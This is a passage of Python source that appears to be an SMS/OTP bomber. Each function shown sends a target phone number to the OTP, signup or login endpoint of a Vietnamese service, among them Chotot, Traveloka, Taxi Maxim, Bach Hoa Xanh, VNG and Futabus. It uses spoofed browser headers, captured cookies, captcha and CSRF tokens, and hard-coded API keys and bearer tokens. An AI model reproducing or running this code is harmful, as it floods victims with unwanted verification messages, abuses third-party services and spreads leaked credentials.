40kCcO_CVcXzYXVzXKh-ICx4cwwgb4Ta2Y15w-Gd34RZw6cH16qEoVO2-AbOh-46qqMNOZb2fZOiDCzX5UiQhGRcNYFnjH8-jkK3YkCtyvwNm_IchdikiALNtHY4aypS0OCuMEOdWUIMEoahTzs5vnxWhjWwwg56ISNOaFSY07dF8RLd8J1Ke6yMQ4ffYQJbwZR_VmtVmdp4TkvSNuXFBlrSwXGOjy_3YIlli2LwfanurK5GBeYeMm-nl0OpT6bH3c7IK9Cc_LC3dYcjolSLM0LuGJ5xlLzcKvMeMJiwyESIPxAgN2FN76ps65kTM44ukzrOqCkaxNSHB7wMWPnKgA6mXNi7k4pAd9J-UMiYJBP3Dpu5ZcOc7tU4EgKQBJTRaP0lxXw6qgHGsptM35ddIAEM1j3P013IZszAopZx8fW1GagxXlI6LbVaASvGi_GSJphcRbD3cBdKsmTbHuNxbiXU5xI7KbPyU-A142__o6PBcy_SVQ-Elwg7bSceSj8DkPGn45KzvhjAe8M-P9SH9PY-X7P3ueSQj383URLi_kD6OPNgLhzp1rTg53fJSsCpbTG2BBnlsB99hN8JySUH7L7pQBlc5on8U33HgoApweT04pNfsIykMK7_V-XvTBmLE",
        "platform": "w"
    })

    payload2 = json.dumps({
        "phone": phone,
        "token": "03AFcWeA7bUVxD2KtwKM1e4sn6t2esd3AHVkV8JXRdMQicKdtBm0y5qd9zNHaQXxhiJ_9A0GeDwI5CcCdOQfRGE4nXl5w72gveOlg_BcWX8O1ijPSxg66b0xLgt-alhmuK3LQmv8_6N0cQAwPCbY3O-4lqKWwUXyxvIr0JFdDVQs_I_sqJjnD0JB-tt5E4MFjRhWXfaNJQIPK4LavDFjMAeL5hrz0_Lt7YkLvgAZ6siF0OYYhvXogykIBOIDB0NDO13ClSGTLEAPhptSEUNctrVg2gXqke6aR65Fuu0gPub1fc4aXwErJ7oN_BByFKtAhRo3U3aBBBr7xq3SRDoi8S-x3QEIC9tZZlVRZBA4eeMDBWUI64Lxgh4XYQIFS5IOIQB6XYhVnsGPbiAltYakeyoFxjxqCjBVZv7qvl68iq-57Omvw1CUyXSXsv6AvB57naa9Z9EcnqkbQSxyhbldfa9JMcHht-fTeh-iZ7-VjqNpz5Fe43JygVkUCF5-rXgH4aa2WgPaVFWUQUtFFKpACJ5bK9Us0x-vH5ozJ_lJnIz8e65Ke5PWSzu_KjvM4gjRHx8KaPR6KHj3h6_NpZKg9SIe9D_2Arm6duQGKfKo3HvpJIlo4YqRI3zYPpvCcxn4ijSoJVW8sIpB-C8lPNQmLxwMgARRdSXOsa1t_TeWnDs3Z8F_duleNxt2Tb43Y3HFWZJp20VbY91GLPjz4ssF0jtql5s9FTUVRT0yQHq_lbWcuAMEfqonzoOU4Fd1_PMDmEzt8Met7srbrK3ozFi-xdRJwnWSA8qW4sh-Nz_nfw5flf28VLN8tgd13acn_nM-QqqTsyPsp6WMpl7weKkYD4MdOeibC944OnrCzahwuVk9L1uQyIG_v3O-yldHUpTue2ZmXv8-ox_92__IkrhSdIqXpUGsZ1PH--jRYlr9dFbZMlMgXJWbMxk8yEwl9-5tbCpEYzMEdEujUYPU8n_GvkY6BQ3D9NhYmv-t1LtHxPT_HFfTvftwRlfL5mxyuLy6Nn1heaQIfFfr9Whg4zPcf6Tr6HtGQbxuSrxVxJOi95Gjc3iB9LnjtA5-FZyf9d-urgN4F0ULW4IpZT9RV9LVI2_YYgq_Mgw1PlJ0IPYjk9GBwZMVpKDnYOfeiULqq3KkxM7OFxNPOoVlWE58qeQHhKgHH9AhtsUVf4A-Y7PPsmlDJIcwbvbaSrycvnV8jFIvLfBVDiQsFvKTZRVnkqAlQ7RuHYTBdAPgAq5JyY_1gofTzxC1o-H8PAE_Jka6t3ZTpUH_Hcz0MfyibIeCzI-MCGNecd5hIZHXJj4N3Oyti8ItQeF6Crikkx8kLg9d2XvYfdqJSW6MvDNDndseFl8qXJ6lKcxxw83nTHO7-sQCUevWKbmXMbzf-eSDgQVRSDNw1pOdcIg7_KH43lQktSEJu5ztOo98WvO5X6eJCEtwSS_TiGqxu8lwtU9vO8r6FOwT9wegjftKqW9oq0ZSr5WlXsvvWf-520yvOBLd66RLwt_eRZUdjcaeP7JHWQSlRhg6eLzkrWaOzf2bFilmlL28W811XB5PflNhCLSx3l2LN9fa7Xmpht0cimxG-FPvK9zxBgff-GRK0BoY4P5vN1f5L_ErG_s8q0RWjLng1FddsYn9RE8BXiB5UEkKnBPWcVCbl8dpOMMnIwV1JQld-hBw9CMBi98ehOurK4VwA0BiGEeQv2j32jJDveDXqKC7KGQ7K8xHJpJD0WZojQSBaxyfPgBaSypPWa1RkiSn1_ZIUbm6PJu6OCCEVvmSpZj5se4Vq9ce9MJJ23OSyBfP-iwBnSXWaEpqkUR4BuHxmrQzZ7e5NBn7d1H2saVDRai35M1AbtHfpEAtIHtneVDzbAy-NXVge0-PDLI7hvZB6U0qhcVtgjOj82XwUjnllwNDnkLTKbT6UyKLXs35D-YTL0vmvMhoY-8ObxBxzUPq0D8d6D1p_otdANwCGEqQSIyy6N9tdpqGJbFKnrywb6",
        "otp": "",
        "password": "",
        "platform": "w"
    })

        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://id.chotot.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://id.chotot.com/",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
        "priority": "u=1, i",
        "Cookie": "_cfuvid=31cRiHPwY5F9U4zsUniqpiCoCb8JEHVTXkEkg5QajhA-1716276463593-0.0.1.1-604800000"
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "ct-idfp": "b8fcf7b8-5256-5e98-959e-f833210deef3",
        "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
        "ct-fingerprint": "28cb390727fca3b8955c1ac97d5dcc65",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://id.chotot.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://id.chotot.com/",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
        "priority": "u=1, i"
    }
        
    response = requests.post(url, data=payload, headers=headers)

    if response.status_code == 406:
        response = requests.post(url2, data=payload2, headers=headers2)
def utoapp_live(phone):
	url = "https://api.utopapp.net/partner/otp/RequestOTP"

	payload = json.dumps({
		"phoneNumber": "+84" + phone[1:]
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"ocp-apim-trace": "true",
		"ocp-apim-subscription-key": "d4fc34dd08904749be498e5e47b813cc",
		"api-version": "v1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://id.utop.vn",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://id.utop.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def bachhoaxanh_live(phone):
	url = "https://apibhx.tgdd.vn/User/LoginWithPassword"

	payload = json.dumps({
		"deviceId": "7b33dc50-81df-4f90-b265-cdf6abbeb30f",
		"userName": phone,
		"isOnlySms": 0,
		"ip": ""
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"deviceid": "7b33dc50-81df-4f90-b265-cdf6abbeb30f",
		"reversehost": "http://bhxapi.live",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "Bearer C56D97E26D5A1DEE4199D9A6A06C082F",
		"referer-url": "https://www.bachhoaxanh.com/dang-nhap",
		"Access-Control-Allow-Origin": "*",
		"xapikey": "bhx-api-core-2022",
		"platform": "webnew",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://www.bachhoaxanh.com",
		"Sec-Fetch-Site": "cross-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://www.bachhoaxanh.com/dang-nhap",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def traveloka_live(phone):
	url = "https://www.traveloka.com/api/v2/user/signup"

	payload = json.dumps({
		"fields": [],
		"data": {
			"userLoginMethod": "PN",
			"username": "+84" + phone[1:]
		},
		"clientInterface": "mobile"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"x-domain": "user",
		"sec-ch-ua-platform": "\"Android\"",
		"sec-ch-ua-mobile": "?1",
		"x-route-prefix": "vi-vn",
		"origin": "https://www.traveloka.com",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.traveloka.com/vi-vn/user/signin",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "tv-repeat-visit=true; countryCode=VN; _cs_c=1; _cs_cvars=%7B%226%22%3A%5B%22Referrer%22%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D%7D; _gid=GA1.2.402664086.1716281101; tv_user={\"authorizationLevel\":100,\"id\":null}; _gac_UA-29776811-12=1.1716281188.Cj0KCQjwjLGyBhCYARIsAPqTz19qGEMjWnxcyrxCt7BIVCtpaOARBpKuqhlNwbVgpKBMn136xd9NiBgaAsExEALw_wcB; _cs_id=a73f303e-aeba-a77d-a922-e19091276457.1716281100.1.1716281187.1716281100.1.1750445100909.1; _cs_s=3.0.0.1716282987935; amp_f4354c=qFgCaI8840fUPrQ8u6VSJz...1hud56hmu.1hud5h5ll.0.1.1; _ga=GA1.2.6451493.1716281101; _ga_RSRSMMBH0X=GS1.1.1716281100.1.1.1716281450.58.0.0; aws-waf-token=138c5b6e-3408-40b6-9eec-37234286cf4f:AAoAmwc+RswAAAAA:TNZ9WMmU2+qsS6tbTXo4UolzgVoQtq2yOf+iCWWPoI70pYzL/L9oUcpifRKDfHLqWK+lLr2K5kB1tz0+1LoLRl6nPuvEopIyjutXl94xcbKaVaazrOSn0nB2HIOIpuYgSfjz1aLwsRcOYpma3okYHUMog2KsWvgFquMf/JOBiBceOmLZp2I9t131+VumJ+eUfUyT4h5wz/lDLjbPseT+I80yNA==; tvl=rBt5WmxNe9sQcAXktXI1JmAW25BtwC0kuMRVYtJoATpXf2nCwaTNLsezG3fYousbZ/gC3gWKLWXhiFWY1h7vHJpWI4dI2m7FatziA6G/3acnvvGsROtOah63a6GFPTTIdlbaq2/IMT8nkBUdwi2IbQHpVEd4b9v6zGgWDfkwNwCtVEHAmBtpnw7REsEFCRyrJDNTkSon3zWB3B78O19aHWRPW/B+duhWg0IWd7yC/bePc6PazaUk7XlMibWat0jwwAuPyXrSF38=~djAy; tvs=lMg+LYeurCxLjGJxDKgrkjBnIp5hI9FqHbF0CQ1g6tfqYAsnBZjyku9pJgGFqyzy5B9fwifKxlkrP1LrhnndaI4mZYHb25lEHRaXVHl2U4B7HBN6wf8Fz0wa/9NXhLD6ELfBqrOULyMFT99LF7Uk6lc2Ic8I+0mMKcMcp4B3oOvdVQn29b9V78pPXU/eOp/fG+SAwAvR6M4jvXFCjloWzK5W4pl9h71ZA2XXnpRwwQFJUdrXkIOUHD8hQc8sasvtV+6wjXr+5dKRT+HVk5Jbu5kZBQyXOhz8RA==~djAy; _dd_s=rum=0&expire=1716282408627&logs=1&id=763da184-4464-4c2e-97c0-e785d1c249d0&created=1716281099202; amp_1a5adb=85rihJFWi1hykV48gs6UWR...1hud56hme.1hud5j12a.c.1.d"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def taximaxim_live(phone):
	format_phone = "84-" + "-".join([phone[1:3], phone[3:7], phone[7:]])

	url = "https://client-sea.taximaxim.com/vi-VN/site/send-code/"
		
	params = {
		"tax-id": "yFL33BWu8yOEhqH0C0bV8BfGWKFjFba7Sxdwcdfppe71sHd4uxidkbS5++YzBsW+iAH1yXFh2Na5bJdvZaNNTNRa6w+Y1xpwqd1XUGEIcJc="
	}
		
	payload = f"_csrf=9yh85bSaswfsuDmuNv0Ha9qR4iYgKARs_zokLEusejWhRhid89j9cp6MX8pehW4S7tuEQRBJVQuwF1ZNJPQRZw%3D%3D&LoginForm%5Borg%5D=maxim&LoginForm%5Bcountry%5D=VN&LoginForm%5BbaseId%5D=8428&LoginForm%5Bphone%5D=%2B{format_phone}&LoginForm%5BsendCodeType%5D=0&LoginForm%5BcaptchaToken%5D=&g-recaptcha-response="
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"X-CSRF-Token": "9yh85bSaswfsuDmuNv0Ha9qR4iYgKARs_zokLEusejWhRhid89j9cp6MX8pehW4S7tuEQRBJVQuwF1ZNJPQRZw==",
		"sec-ch-ua-mobile": "?1",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://client-sea.taximaxim.com",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://client-sea.taximaxim.com/vi-VN/frame/?tax-id=yFL33BWu8yOEhqH0C0bV8BfGWKFjFba7Sxdwcdfppe71sHd4uxidkbS5%2B%2BYzBsW%2BiAH1yXFh2Na5bJdvZaNNTNRa6w%2BY1xpwqd1XUGEIcJc%3D&c=vn&l=vi-VN&b=8428&p=1&theme=maximV3&country=vn&city=8428&fp=ea2b8f8a-663f-49c4-b71a-06f36495fd12&t=1",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"Cookie": "_gcl_au=1.1.381125724.1716281668; _fbp=fb.1.1716281669135.949143864; _tt_enable_cookie=1; _ttp=PJ3NRw9MGpL0a9GOICmLM2HFYEA; tmr_lvid=79f70b52094cf0a20614121c8c2b680e; tmr_lvidTS=1716281670164; _ym_uid=1716281671776465503; _ym_d=1716281671; _ym_isad=2; _ym_visorc=b; _gid=GA1.2.595261679.1716281683; __intl=66c3138a24eb1e84e4d3a062d59a5ef387123afdd6eb1e71d9f349d81ff75320a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22__intl%22%3Bi%3A1%3Bs%3A5%3A%22vi-VN%22%3B%7D; TAXSEE_V3MAXIM=uj6mnmtv38q43t47clsp7tf6mi; __finger_print_hash=3d119de11d0a3126ad4051ac620d62a1cddafa6e2b0d97189c55d04775859431a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22__finger_print_hash%22%3Bi%3A1%3Bs%3A36%3A%22ea2b8f8a-663f-49c4-b71a-06f36495fd12%22%3B%7D; __taxsee_country=4e9c46d06cb6846f426988a519c8f3d9e8900164555a7fa62c33cea131df831ea%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22__taxsee_country%22%3Bi%3A1%3Bs%3A2%3A%22VN%22%3B%7D; __taxsee_base=4f7d854436391c8d23427dda3fe895dd853bc3862b37d808004b2b9c53c219e1a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22__taxsee_base%22%3Bi%3A1%3Bs%3A4%3A%228428%22%3B%7D; _csrf=c2e772e660af433fc007ff22de5d8beba0b4fe5e65ea448ce01db1a6d8f7f150a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22VndxGBNur4fdhxiy4Jfg0aQgO-raoXkR%22%3B%7D; _ga_T2DPT2GHZ5=GS1.1.1716281683.1.1.1716282140.0.0.0; _ga=GA1.1.519564268.1716281669; tmr_detect=0%7C1716282143681; _gat=1; _ga_16MGM3R9TE=GS1.1.1716281668.1.1.1716282178.39.0.0"
	}
		
	response = requests.post(url, params=params, data=payload, headers=headers)
def aloline_live(phone):
	url = "https://api.gateway.overate-vntech.com/api/v8/customers/register"

	payload = json.dumps({
		"phone": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"Accepts": "application/json",
		"Method": "1",
		"ProjectId": "8003",
		"sec-ch-ua-mobile": "?1",
		"Authorization": "Basic Mzk5OTYzNTU1LTE3MTYyODMzNzkzNzQtMjE2NzQ3MQ==:YWxvbGluZTo1YTBkMTkxY2MxZDY1NjA2NWU4NDEwNjI2ZjRmMzg5ZQ==",
		"Access-Control-Allow-Methods": "GET,PUT,OPTIONS",
		"Access-Control-Allow-Origin": "*",
		"Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://aloline.vn",
		"Sec-Fetch-Site": "cross-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://aloline.vn/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def mioto_live(phone):
	url = "https://accounts.mioto.vn/mapi/phone/otp/gen"

	params = {
		"phone": " 84" + phone[1:],
		"action": "1",
		"otpBy": "0"
	}
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://www.mioto.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.mioto.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "_vid=aHT3y5olH8jjGdNf; _hv=012aafdbd7f66843d20ece91f82bfeec7092a6de15fef13e2f1f1e915c038437; _gcl_au=1.1.932856478.1716284347; _ga=GA1.1.1655163636.1716284347; _fbp=fb.1.1716284347997.1745368523; _ga_ZYXJJRHCTB=GS1.1.1716284347.1.1.1716284402.0.0.0; _ga_69J768NCYT=GS1.1.1716284347.1.1.1716284402.5.0.0; _mid=un2zrv.kKzu7jpheiJL5tUzwyR5qfT4lTjvj4HWvhajMe_te6gXFt7SnvQrMH2m2VGCjMgNt1i9--4_Iog7d5Z9GqWV8w; _hs=4fb0c5e91b79e5d4863c4d7e8d1ea2852f02b2fab9641b02e5fb2e3558a4e0f4"
	}
		
	response = requests.post(url, params=params, headers=headers)
def paynetonline_live(phone):
	url = "https://merchant.paynetone.vn/User/GetOTP"

	payload = f"MobileNumber={phone}&IsForget=N"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://merchant.paynetone.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://merchant.paynetone.vn/User/Create",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers, verify=False)
def vng_live(phone):
	url = "https://id.vnggames.app/api/v1/signup"

	payload = json.dumps({
		"phone": phone,
		"password": "AZ56pkAeNfyXemY",
		"regionCode": "",
		"isoCode": "VN",
		"countryCode": "VN",
		"countryCodeType": "1",
		"languageCode": "vi",
		"deviceId": "Chrome/124_Android/10_mobile_none/K",
		"clientId": "0"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://id.vnggames.app",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://id.vnggames.app/register?back=https%3A%2F%2Fsso.vnggames.com%2Fsso%2Fbridge%2Fcallback%3Fr_state%3D9SZCJ4aIIOiPy08M3KnFZolbxp_WyxGkoQhpIS-MIn002R_lOQOYfVIVh90z7h1s_08iLzLS5-wNg0aaTjpnwFkMC1_EwqhXIwp3tspY1o81tTmc6_wTACwW5actPpc4JhO_e03brorjWt8yiArXASzye-p5hVAhGD4jM43eu1eDD5qwXT2plRLfwkaTcUltZOYqFXPj7_RXgn0HDC_D&client_id=0&lang=vi",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "__gg_locale=vi; _ga=GA1.1.379890642.1716288981; __gg_client_sid=b3a4a60b-8083-45b1-b64c-7bf69ccf06b3; _ga_KXMKNHV7BG=GS1.1.1716288981.1.1.1716289001.0.0.0"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def fuatabus_live(phone):
	url = "https://api.vato.vn/api/authenticate/request_code"

	payload = json.dumps({
		"phoneNumber": phone,
		"deviceId": "4a24eb09-39ef-44eb-af5b-ed6ef6f4de34",
		"use_for": "LOGIN"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"x-app-id": "client",
		"sec-ch-ua-mobile": "?1",
		"x-access-token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjOTNjMWEyNGNhZjgyN2I4ZGRlOWY4MmQyMzE1MzY1MDg4YWU2MTIiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcxNjI4OTMyOCwidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzE2Mjg5MzI4LCJleHAiOjE3MTYyOTI5MjgsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.VqhtsAulTLNpLPS-F49THxsK5PLa0zP9uSlcz1SlMwTmC2DrkmmEfWxcQR9-iMhIb5G0_-3Qir-9-uCCva1sXkqtMy03tPHb9ob02WLRrv4fLyQQjhe3T94yERR-N3e656ZCcmaRQFT2MM566Fu6DZ_VfKVRJqyecFX2HpKF43_IZW20Oprf3R_SWmNSn0rFi3g6HOqRd9ukvYj_iLh5c3eDMaaOkP4BwOecrC6y7kySuiCNGgdxDk5K5iBlZC4RZZx0nSSvynBUwC4SEGXqPtkUcKMPxbaBqxgEBQXVQ4q7omNe6nHSmuygSOPV3-n36O-DgSzq44OaDMYRx_Xk-g",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://futabus.vn",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://futabus.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def oreka_live(phone):
	url = "https://www.oreka.vn/graphql"

	payload = json.dumps({
		"variables": {
			"phone": phone,
			"locale": "vi"
		},
		"query": "mutation ($phone: String!, $locale: String!) {\nsendVerifyPhoneApp(phone: $phone, locale: $locale)\n}\n"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "",
		"x-by-platform": "MOBILE_WEB",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://www.oreka.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.oreka.vn/login",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
